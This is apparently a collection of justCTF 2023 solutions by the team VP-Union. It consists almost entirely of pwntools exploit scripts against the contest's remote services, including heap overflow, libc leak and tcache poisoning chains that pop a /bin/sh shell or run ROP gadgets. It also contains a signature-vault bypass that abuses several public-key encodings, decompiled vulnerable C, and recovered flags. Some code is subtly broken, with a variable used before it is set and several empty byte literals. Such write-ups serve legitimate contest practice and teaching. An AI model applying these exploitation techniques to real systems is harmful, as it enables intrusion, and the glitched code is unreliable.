# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/justCTF_2023_Writeup_by_VP-Union.md
# TITLE: justCTF 2023 Writeup by VP-Union
# CATEGORY: pwn

#!/usr/bin/env python3
# -*- coding:
utf-8 -*-

from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')

sh = remote('house.nc.jctf.pro', 1337)
sh.sendlineafter(b'>>  ', b'1')
sh.sendlineafter(b': ', b'xmcve')
sh.sendlineafter(b': ', b'root'.ljust(0x18, b'') + b'xff' * 8)
sh.sendlineafter(b': ', str(-152))
sh.sendlineafter(b'>>  ', b'2')

sh.interactive()
#!/usr/bin/env python3
# -*- coding:
utf-8 -*-

from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')

sh = remote('nucleus.nc.jctf.pro', 1337)

sh.sendlineafter(b'> ', b'2')
sh.sendlineafter(b': ', b'ab' * 0x1f0)
sh.sendlineafter(b'> ', b'2')
sh.sendlineafter(b': ', b'ab')
sh.sendlineafter(b'> ', b'2')
sh.sendlineafter(b': ', b'ab')
sh.sendlineafter(b'> ', b'3')
sh.sendlineafter(b': ', b'd')
sh.sendlineafter(b': ', b'0')

sh.sendlineafter(b'> ', b'5')
sh.sendlineafter(b': ', b'-1024')
sh.recvuntil(b'content: ')
libc_addr = u64(sh.recvn(6) + b'') - 0x1ecbe0
success('libc_addr: ' + hex(libc_addr))
sh.sendlineafter(b'> ', b'3')
sh.sendlineafter(b': ', b'd')
sh.sendlineafter(b': ', b'2')
sh.sendlineafter(b'> ', b'3')
sh.sendlineafter(b': ', b'd')
sh.sendlineafter(b': ', b'1')
sh.sendlineafter(b'> ', b'2')
sh.sendlineafter(b': ', (b'$2000a' + p64(libc_addr + 0x1eee48)).ljust(0x1f0 * 2, b''))

sh.sendlineafter(b'> ', b'2')
sh.sendlineafter(b': ', b'/bin/sh')
sh.sendlineafter(b'> ', b'2')
sh.sendlineafter(b': ', p64(libc_addr + 0x52290))

sh.sendlineafter(b'> ', b'3')
sh.sendlineafter(b': ', b'd')
sh.sendlineafter(b': ', b'1')

sh.interactive()
// sub_14DF
_BYTE *__fastcall print_and_malloc(const char *msg, unsigned int len)
{
  int v2; // ebp
  _BYTE *v3; // rax
  _BYTE *v4; // r14
  _BYTE *v5; // rbx
  _BYTE *v6; // rbp
  char buf; // [rsp+7h] [rbp-31h] BYREF
  unsigned __int64 v9; // [rsp+8h] [rbp-30h]

  v9 = __readfsqword(0x28u);
  __printf_chk(1LL, "%s", msg);
  v2 = 1024;
  if ( len <= 0x400 )
    v2 = len;
  v3 = malloc(v2);
  v4 = v3;
  if ( v2 > 0 )
  {
    v5 = v3;
    v6 = &v3[v2];
    do
    {
      if ( !read(0, &buf, 1uLL) )
        break;
      if ( !buf )
        break;
      *v5++ = buf;
    }
    while ( v5 != v6 );
  }
  v4[len] = 0;                                  // heap overflow
  return v4;
}
void __fastcall create()
{
    ...
    v3 = print_and_malloc("contents: ", v2);
    v4 = creat(file_path, 0600u);
    if ( v4 < 0 )
    {
      perror("creat");
      exit(1);
    }
    v5 = strlen(v3);
    if ( write(v4, v3, v5) < 0 ) // leak
    {
      perror("write");
      exit(1);
    }
    if ( close(v4) < 0 )
    {
      perror("close");
      exit(1);
    }
    __printf_chk(1LL, "Data saved to: %sn", file_path);
    free(v3);
    free(v1);
  }
}
#!/usr/bin/env python3
# -*- coding:
utf-8 -*-

from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')

def create(f_len, f, c_len, c):
    sh.sendlineafter(b'> ', b'0')
    sh.sendlineafter(b'size: ', str(f_len).encode())
    sh.sendafter(b'fname: ', f)
    sh.sendlineafter(b'len: ', str(c_len).encode())
    sh.sendafter(b'contents: ', c)

def show(f_len, f):
    sh.sendlineafter(b'> ', b'2')
    sh.sendlineafter(b'size: ', str(f_len).encode())
    sh.sendafter(b'fname: ', f)

while(True):
    sh = remote('mysterylocker.nc.jctf.pro', 1337)
    salt = str(randint(0, 0x100000000)).encode()
    create(0x400, salt + b'', 0x400, b'')
    create(0x400, salt + b'1', 0x400, b'')
    show(0x400, salt + b'1')
    heap_addr = u64(sh.recvn(5) + b'') << 12
    success('heap_addr: ' + hex(heap_addr))
    heap_0x100_0 = heap_addr + 0xb10
    heap_0x100_1 = heap_addr + 0xc10
    heap_0x50_0 = heap_addr + 0xd10
    heap_func_0 = heap_addr + 0x2a0
    heap_0x100_content = (heap_0x100_0 >> 12) ^ heap_0x100_1
    success('heap_0x100_1_fake: ' + hex(heap_0x100_1_fake))
    heap_0x100_1_fake = (heap_0x100_content & (~0xff)) ^ (heap_0x100_0 >> 12)
    if (heap_0x100_1_fake % 0x10) == 0 and heap_0x100_1_fake > heap_0x100_1:
        break
    sh.close()

success('heap_0x100_1: ' + hex(heap_0x100_1))
success('heap_0x100_1_fake: ' + hex(heap_0x100_1_fake))

create(0xf0, salt + b'2', 0xf0, b' ' * (heap_0x100_1_fake - heap_0x100_1 - 8) + p16(0x111) + b'')
create(0x840, salt + b'3', 0xf0, b'')
create(0x40, salt + b'4', 0x40, b'')
create(0xf0, salt + b'5', 0xf0, b' ' * (heap_0x50_0 - heap_0x100_1_fake - 8) + p8(0x51) + b'       ' + p64((heap_0x50_0 >> 12) ^ heap_func_0)[:6] + b'')
create(0xa39, salt + b'6', 0xf0, b'')
create(0xa3a, salt + b'7', 0xf0, b'')
create(0xa3b, salt + b'8', 0xf0, b'')
create(0xa3c, salt + b'9', 0xf0, b'')
create(0xa3d, salt + b'10', 0xf0, b'')
create(0xa3e, salt + b'11', 0xf0, b'')
create(0xa3f, salt + b'12', 0xf0, b'')
create(0x40, salt + b'13', 0x40, b'')
show(0x400, salt + b'13')
image_addr = u64(sh.recvn(6) + b'') - 0x1db4
success('image_addr: ' + hex(image_addr))
create(0x240, salt + b'14', 0x240, b'')
create(0x260, salt + b'15', 0x260, b'')

create(0x400, salt + b'16', 0x100, b' ' * (heap_0x50_0 - heap_0x100_1_fake - 8) + p16(0x7b1) + b'')
create(0x400, salt + b'17', 0x40, b'')
create(0x400, salt + b'18', 0x40, b'')
show(0x400, salt + b'18')
libc_addr = u64(sh.recvn(6) + b'') - 0x1f71b0
success('libc_addr: ' + hex(libc_addr))
create(0x400, salt + b'19', 0x20, b' ' * 0x10 + p64(libc_addr + 0x79f30)[:6] + b'')

sh.sendlineafter(b'> ', b'2')
sh.sendline(b'' * 0x528 + p64(libc_addr + 0x0000000000022fd9) + p64(libc_addr + 0x00000000000240e5) + p64(libc_addr + 0x1b51d2) + p64(libc_addr + 0x4ebf0))

sh.interactive()
sqlite> select edit('', '/jailed/readflag');
justCTF{SQL1t3_F34tur3_n0t_bug}
sqlite> select edit('', '/jailed/readflag');
justCTF{SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1}
from coincurve import PublicKey
import json

FLAG = 'justWTF{th15M1ghtB34(0Rr3CtFl4G!Right????!?!?!??!!1!??1?}'
PUBKEYS = ['025056d8e3ae5269577328cb2210bdaa1cf3f076222fcf7222b5578af846685103', 
            '0266aa51a20e5619620d344f3c65b0150a66670b67c10dac5d619f7c713c13d98f', 
            '0267ccabf3ae6ce4ac1107709f3e8daffb3be71f3e34b8879f08cb63dff32c4fdc']

class FlagVault:
    def __init__(self, flag):
        self.flag = flag
        self.pubkeys = []

    def get_keys(self, _data):
        return str([pk.format().hex() for pk in self.pubkeys])

    def enroll(self, data):
        if len(self.pubkeys) > 3:
            raise Exception("Vault public keys are full")

        pk = PublicKey(bytes.fromhex(data['pubkey']))
        self.pubkeys.append(pk)
        return f"Success. There are {len(self.pubkeys)} enrolled"

    def get_flag(self, data):
        # Deduplicate pubkeys
        auths = {bytes.fromhex(pk): bytes.fromhex(s) for (pk, s) in zip(data['pubkeys'], data['signatures'])}

        if len(auths) < 3:
            raise Exception("Too few signatures")

        if not all(PublicKey(pk) in self.pubkeys for pk in auths):
            raise Exception("Public key is not authorized")

        if not all(PublicKey(pk).verify(s, b'get_flag') for pk, s in auths.items()):
            raise Exception("Signature is invalid")

        return self.flag

def write(data):
    print(json.dumps(data))

def read():
    try:
        return json.loads(input())
    
except EOFError:
        exit(0)

WELCOME = """
Welcome to the vault! Thank you for agreeing to hold on to one of our backup keys.

The vault requires 3 of 4 keys to open. Please enroll your public key.
"""

if __name__ == "__main__":
    vault = FlagVault(FLAG)
    for pubkey in PUBKEYS:
        vault.enroll({'pubkey': pubkey})

    write({'message': WELCOME})
    while True:
        try:
            data = read()
            if data['method'] == 'get_keys': 
                write({'message': vault.get_keys(data)})
            elif data['method'] == 'enroll':
                write({'message': vault.enroll(data)})
            elif data['method'] == "get_flag":
                write({'message': vault.get_flag(data)})
            else:
                write({'error': 'invalid method'})
        
except Exception as e:
            write({'error': repr(e)})
def enroll(self, data):
        if len(self.pubkeys) > 3:
            raise Exception("Vault public keys are full")
import json
from pwn import *
from coincurve import PublicKey, keys, PrivateKey

context.log_level = 'debug'

def write(data):
    return json.dumps(data)

sh = remote('vaulted.nc.jctf.pro', 1337)
sh.recvline()
t = write({'method': 'get_keys'})
sh.sendline(t.encode())
sh.recvline()

# 塞入新建公钥
private_key_hex = 'f8f8a2f43c8376ccb0871305060d7b27b0554d2cc72bccf41b2705608452f315'
private_key = bytes.fromhex(private_key_hex)
public_key = PublicKey.from_valid_secret(private_key).format(compressed=False)
public_key_hex = public_key.hex()
t = write({'method': 'enroll', 'pubkey': public_key_hex})
sh.sendline(t.encode())
sh.recvline()

# 利用公钥解析的三种格式完成挑战
ps = [PublicKey.from_valid_secret(private_key).format(compressed=False).hex(),
      PublicKey.from_valid_secret(private_key).format(compressed=True).hex(),
      '06' + PublicKey.from_valid_secret(private_key).format(compressed=False).hex()[2:]]

s = PrivateKey(private_key).sign(b'get_flag').hex()
t = write({'method': 'get_flag', 'pubkeys': ps, 'signatures': [s for _ in range(3)]})
sh.sendline(t.encode())
sh.interactive()
# justCTF{n0nc4n0n1c4l_72037872768289199286663281818929329}
from pwn import *
while True:
    conn = remote("eccfordummies.nc.jctf.pro",1337)
    conn.recv().decode()
    for i in range(8):
        conn.sendline(" ".encode())
        conn.recv().decode()
    conn.sendline("0 1 1 1 0".encode())
    print(conn.recv().decode())
v4 = [0]*64
v4[37] = 7
v4[41] = 28
v4[42] = 255
v4[24] = 3
v4[38] = 33
v4[25] = 26
v4[26] = 17
v4[27] = 20
v4[32] = 17
v4[33] = 17
v4[29] = 19
v4[30] = 1
v4[31] = 32
v4[19] = 8
v4[40] = 11
v4[39] = 11
v4[17] = 11
v4[23] = 11
v4[8] = 21
v4[9] = 51
v4[34] = 24
v4[16] = 15
v4[10] = 26
v4[11] = 9
v4[12] = 20
v4[13] = 18
v4[3] = 5
v4[28] = 34
v4[4] = 27
v4[5] = 13
v4[6] = 29
v4[35] = 26
v4[21] = 26
v4[15] = 26
v4[7] = 26
v4[36] = 2
v4[18] = 0
v4[20] = 13
v4[22] = 29
v4[14] = 19
v4[0] = 9
v4[1] = 2
v4[2] = 19
xxx = b"abcdefghijklmnopqrstuvwxyz_{}0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
for i in v4:
    print(chr(xxx[i]),end='')
    #jctf{n0_vM_just_plain_0ld_ru5tb3rry_ch4ll}
